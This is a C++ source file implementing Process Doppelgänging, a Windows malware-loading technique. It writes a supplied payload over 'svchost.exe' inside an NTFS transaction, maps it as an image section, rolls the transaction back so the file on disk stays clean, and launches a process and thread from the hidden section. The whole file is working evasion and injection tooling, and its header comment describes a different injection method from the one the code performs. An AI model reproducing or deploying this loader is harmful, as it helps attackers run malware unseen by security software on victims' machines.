/**
* Injects shellcode into every thread of a process using Get/SetThreadContext.
* Supports 32- and 64 Bit applications. The 64 bit implementation currently does not support copying the environment in the remote process.
* No support for WoW64
* Based on: https://www.blackhat.com/docs/eu-17/materials/eu-17-Liberman-Lost-In-Transaction-Process-Doppelganging.pdf
*/

#include <Windows.h>
#include <iostream>
#include <KtmW32.h>
#include <userenv.h>

#include "ntddk.h"


#define PS_INHERIT_HANDLES 4
#define RTL_USER_PROC_PARAMS_NORMALIZED 0x00000001

using fnNtCreateProcessEx = NTSTATUS(NTAPI*)(
	_Out_ PHANDLE ProcessHandle,
	_In_ ACCESS_MASK DesiredAccess,
	_In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
	_In_ HANDLE ParentProcess,
	_In_ ULONG Flags,
	_In_opt_ HANDLE SectionHandle,
	_In_opt_ HANDLE DebugPort,
	_In_opt_ HANDLE ExceptionPort,
	_In_ ULONG JobMemberLevel
	);

using fnNtCreateThreadEx = NTSTATUS(NTAPI*) (
	OUT  PHANDLE ThreadHandle,
	IN  ACCESS_MASK DesiredAccess,
	IN  POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
	IN  HANDLE ProcessHandle,
	IN  PVOID StartRoutine,
	IN  PVOID Argument OPTIONAL,
	IN  ULONG CreateFlags,
	IN  ULONG_PTR ZeroBits,
	IN  SIZE_T StackSize OPTIONAL,
	IN  SIZE_T MaximumStackSize OPTIONAL,
	IN  PVOID AttributeList OPTIONAL
	);

using fnRtlCreateProcessParametersEx = NTSTATUS(NTAPI*)(
	_Out_ PRTL_USER_PROCESS_PARAMETERS* pProcessParameters,
	_In_ PUNICODE_STRING ImagePathName,
	_In_opt_ PUNICODE_STRING DllPath,
	_In_opt_ PUNICODE_STRING CurrentDirectory,
	_In_opt_ PUNICODE_STRING CommandLine,
	_In_opt_ PVOID Environment,
	_In_opt_ PUNICODE_STRING WindowTitle,
	_In_opt_ PUNICODE_STRING DesktopInfo,
	_In_opt_ PUNICODE_STRING ShellInfo,
	_In_opt_ PUNICODE_STRING RuntimeData,
	_In_ ULONG Flags
	);

fnNtCreateProcessEx NtCreateProcessEx;
fnNtCreateThreadEx NtCreateThreadEx;
fnRtlCreateProcessParametersEx RtlCreateProcessParametersEx;

int8_t* CreatePayloadBuffer(char* filename, DWORD* filesize)
{
	// open payload file
	HANDLE payloadFile = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (payloadFile == INVALID_HANDLE_VALUE)
	{
		printf("[Error] %d - Failed to open payload %s\n", GetLastError(), filename);
		return nullptr;
	}

	// create a mapping of the payload
	HANDLE payloadMapping = CreateFileMapping(payloadFile, 0, PAGE_READONLY, 0, 0, 0);
	if (!payloadMapping)
	{
		printf("[Error] %d - Failed to CreateFileMapping\n", GetLastError());
		CloseHandle(payloadFile);
		return nullptr;
	}

	// map a view of the payload file into the process
	int8_t* payloadDataView = (int8_t*)MapViewOfFile(payloadMapping, FILE_MAP_READ, 0, 0, 0);
	if (!payloadDataView)
	{
		printf("[Error] %d - Failed to MapViewOfFile\n", GetLastError());
		CloseHandle(payloadMapping);
		CloseHandle(payloadFile);
		return nullptr;
	}

	// allocate space for a copy of the payload
	*filesize = GetFileSize(payloadFile, 0);
	int8_t* payloadFileCopy = (int8_t*)VirtualAlloc(NULL, *filesize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!payloadFileCopy)
	{
		printf("[Error] %d - Failed to VirtualAlloc\n", GetLastError());
		return nullptr;
	}

	// copy payload into allocated memory
	memcpy(payloadFileCopy, payloadDataView, *filesize);

	// cleanup
	UnmapViewOfFile(payloadDataView);
	CloseHandle(payloadMapping);
	CloseHandle(payloadFile);
	return payloadFileCopy;
}

HANDLE CreateDirtySectionOfCleanFile(int8_t* payloadBuffer, DWORD payloadSize)
{
	// create transaction to be rolled back later
	HANDLE transaction = CreateTransaction(nullptr, nullptr, 0, 0, 0, 0, nullptr);
	if (transaction == INVALID_HANDLE_VALUE)
	{
		printf("[Error] %d - Failed to CreateTransaction\n", GetLastError());
		return nullptr;
	}

	// open a clean file transacted
	HANDLE transactedFile = CreateFileTransacted("svchost.exe",
		GENERIC_WRITE | GENERIC_READ,
		0,
		nullptr,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		nullptr,
		transaction,
		nullptr,
		nullptr
	);
	if (transactedFile == INVALID_HANDLE_VALUE)
	{
		printf("[Error] %d - Failed to CreateFileTransacted\n", GetLastError());
		return nullptr;
	}

	// overwrite file with malicious payload
	DWORD numberOfBytesWritten;
	if (!WriteFile(transactedFile, payloadBuffer, payloadSize, &numberOfBytesWritten, nullptr))
	{
		printf("[Error] %d - Failed to WriteFile\n", GetLastError());
		return nullptr;
	}

	// create a dirty section
	HANDLE section = nullptr;
	if (!NT_SUCCESS(NtCreateSection(&section, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, transactedFile)))
	{
		printf("[Error] - Failed to NtCreateSection for malicious executable\n");
		return nullptr;
	}
	CloseHandle(transactedFile);

	// rollback transaction so file system is clean again while we still have a dirty section
	if (!RollbackTransaction(transaction))
	{
		printf("[Error] %d - Failed to RollbackTransaction\n", GetLastError());
		return nullptr;
	}
	CloseHandle(transaction);
	return section;
}

LPVOID WriteParametersIntoRemoteProcess(HANDLE processHandle, PRTL_USER_PROCESS_PARAMETERS processParameters)
{
	// determine which local address is lower so we can copy the parameters to a single page
	PVOID bufferStart = processParameters < processParameters->Environment ? processParameters : processParameters->Environment;
	PVOID bufferEnd = processParameters < processParameters->Environment ? (int8_t*)processParameters + processParameters->Length : (int8_t*)processParameters->Environment + processParameters->EnvironmentSize;
	DWORD_PTR bufferSize = (DWORD_PTR)bufferEnd - (DWORD_PTR)bufferStart;

	PVOID remoteMemory = VirtualAllocEx(processHandle, bufferStart, bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!remoteMemory)
	{
		printf("[Error] %d - Failed to VirtualAllocEx at address %p\n", GetLastError(), bufferStart);
		return nullptr;
	}

	if (!WriteProcessMemory(processHandle, processParameters, processParameters, processParameters->Length, nullptr))
	{
		printf("[Error] %d - Failed to write PRTL_USER_PROCESS_PARAMETERS to remote process\n", GetLastError());
		return nullptr;
	}

#ifdef _WIN64
	printf("[Warning] - The current x64 implemenation does not support copying the environment since writing the environment to the remote process fails\n");
#else
	if (processParameters->Environment)
	{
		if (!WriteProcessMemory(processHandle, processParameters->Environment, processParameters->Environment, processParameters->EnvironmentSize, nullptr))
		{
			printf("[Error] %d - Failed to write environment to remote process\n", GetLastError());
			return nullptr;
		}
	}
#endif
	return processParameters;
}

bool SetupProcessParameters(HANDLE processHandle, PROCESS_BASIC_INFORMATION& processBasicInformation, char* targetPath)
{
	// initialise process parameters
	ANSI_STRING targetPathAnsi;
	UNICODE_STRING targetPathUni;
	UNICODE_STRING uWindowName;
	UNICODE_STRING dllPathUni;
	UNICODE_STRING currentDirectoryPathUni;

	wchar_t dllPath[] = L"C:\\Windows\\System32";
	wchar_t windowName[] = L"Process Doppelganging";
	wchar_t currentDirectoryPath[MAX_PATH];
	GetCurrentDirectoryW(MAX_PATH, currentDirectoryPath);

	RtlInitUnicodeString(&uWindowName, windowName);
	RtlInitUnicodeString(&currentDirectoryPathUni, currentDirectoryPath);
	RtlInitUnicodeString(&dllPathUni, dllPath);
	RtlInitAnsiString(&targetPathAnsi, targetPath);
	RtlAnsiStringToUnicodeString(&targetPathUni, &targetPathAnsi, TRUE);

	LPVOID environment;
	CreateEnvironmentBlock(&environment, NULL, TRUE);

	PRTL_USER_PROCESS_PARAMETERS processParameters = nullptr;
	if (!NT_SUCCESS(RtlCreateProcessParametersEx(&processParameters, &targetPathUni, &dllPathUni, &currentDirectoryPathUni, &targetPathUni, environment, &uWindowName, nullptr, nullptr, nullptr, RTL_USER_PROC_PARAMS_NORMALIZED)))
	{
		printf("[Error] - Failed to RtlCreateProcessParametersEx\n");
		return false;
	}

	// write process parameters into the remote process
	LPVOID remoteProcessParameters = WriteParametersIntoRemoteProcess(processHandle, processParameters);
	if (!remoteProcessParameters)
	{
		printf("[Error] - Failed to write process parameters into remote process\n");
		return false;
	}

	int8_t* remoteProcessParameterAddress = (int8_t*)processBasicInformation.PebBaseAddress + offsetof(PEB, ProcessParameters);

	// update pointer to process parameters in remote PEB
	if (!WriteProcessMemory(processHandle, remoteProcessParameterAddress, &remoteProcessParameters, sizeof(PVOID), nullptr))
	{
		printf("[Error] %d - Failed to write process parameters into remote PEB\n", GetLastError());
		return false;
	}

	return true;
}

int8_t* ReadEntryPointOfRemoteProcess(HANDLE processHandle, PROCESS_BASIC_INFORMATION& processBasicInformation)
{
	// read base address of process
	int64_t pebOffset = (int64_t)processBasicInformation.PebBaseAddress + 2 * sizeof(void*);
	int8_t* processBasesAddress = 0;
	if (!ReadProcessMemory(processHandle, (LPCVOID)pebOffset, &processBasesAddress, sizeof(void*), NULL))
	{
		printf("[Error] %d - Failed to read PEB offset\n", GetLastError());
		return nullptr;
	}

	printf("[Info] - Remote base address %p\n", processBasesAddress);

	// read PE headers
	const int numberOfBytesToRead = 4096;
	int8_t peBuffer[numberOfBytesToRead] = {};
	if (!ReadProcessMemory(processHandle, processBasesAddress, peBuffer, numberOfBytesToRead, NULL))
	{
		printf("[Error] %d - Failed to read PE header\n", GetLastError());
		return nullptr;
	}

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)peBuffer;
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)(peBuffer + dosHeader->e_lfanew);
	int8_t* entryPoint = (int8_t*)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)processBasesAddress);
	printf("[Info] - Remote entry point %p\n", entryPoint);
	return entryPoint;
}


bool Doppelgang(char* targetPath, int8_t* payloadBuffer, DWORD payloadSize)
{
	// create a dirty section of a file that is clean on disc
	HANDLE dirtySection = CreateDirtySectionOfCleanFile(payloadBuffer, payloadSize);
	if (!dirtySection)
	{
		return false;
	}

	// create a process using the dirty section
	HANDLE processHandle = nullptr;
	if (!NT_SUCCESS(NtCreateProcessEx(&processHandle, PROCESS_ALL_ACCESS, NULL, GetCurrentProcess(), PS_INHERIT_HANDLES, dirtySection, NULL, NULL, FALSE)))
	{
		printf("[Error] - Failed to NtCreateProcessEx using dirty section");
		return false;
	}

	DWORD returnLength = 0;
	PROCESS_BASIC_INFORMATION processBasicInformation = {};
	NTSTATUS error = NtQueryInformationProcess(processHandle, ProcessBasicInformation, &processBasicInformation, sizeof(PROCESS_BASIC_INFORMATION), &returnLength);
	if (error)
	{
		printf("[Error] %d - Failed to query process basic information\n", GetLastError());
		return false;
	}
	PVOID remoteEntryPoint = ReadEntryPointOfRemoteProcess(processHandle, processBasicInformation);
	if (!remoteEntryPoint)
	{
		printf("[Error] - Failed to ReadEntryPointOfRemoteProcess\n");
		return false;
	}

	if (!SetupProcessParameters(processHandle, processBasicInformation, targetPath))
	{
		printf("[Error] - Failed to SetupProcessParameters\n");
		return false;
	}

	HANDLE threadHandle = NULL;
	if (!NT_SUCCESS(NtCreateThreadEx(&threadHandle, THREAD_ALL_ACCESS, NULL, processHandle, (LPTHREAD_START_ROUTINE)remoteEntryPoint, NULL, FALSE, 0, 0, 0, NULL)))
	{
		printf("[Error] - Failed to NtCreateThreadEx\n");
		return false;
	}
	return true;
}


int main(int argc, char* argv[])
{
	char* targetPath = "C:\\Windows\\System32\\notepad.exe";
	char* payloadPath = argv[1];

	if (argc < 2)
	{
		printf("Usage: *.exe executablePayloadPath\n");
	}

	HMODULE ntdllHandle = LoadLibraryA("ntdll.dll");
	if (!ntdllHandle)
	{
		printf("[Error] - Failed to LoadLibraryA ntdll\n");
		return 1;
	}
	NtCreateProcessEx = (fnNtCreateProcessEx)GetProcAddress(ntdllHandle, "NtCreateProcessEx");
	NtCreateThreadEx = (fnNtCreateThreadEx)GetProcAddress(ntdllHandle, "NtCreateThreadEx");
	RtlCreateProcessParametersEx = (fnRtlCreateProcessParametersEx)GetProcAddress(ntdllHandle, "RtlCreateProcessParametersEx");

	if (!RtlCreateProcessParametersEx || !NtCreateProcessEx || !NtCreateThreadEx)
	{
		printf("[Error] - Failed to resolve NtCreateProcessEx, NtCreateThreadEx or RtlCreateProcessParametersEx\n");
		return 1;
	}

	DWORD payloadSize = 0;
	int8_t* payloadBuffer = CreatePayloadBuffer(payloadPath, &payloadSize);
	if (!payloadBuffer)
	{
		printf("[Error] - Failed to read payload\n");
		return 1;
	}

	if (!Doppelgang(targetPath, payloadBuffer, payloadSize))
	{
		printf("[Error] - Failed process doppelganging\n");
		return 1;
	}

	// frees entire page allocated by VirtualAlloc
	VirtualFree(payloadBuffer, 0, MEM_RELEASE);
	return 0;
}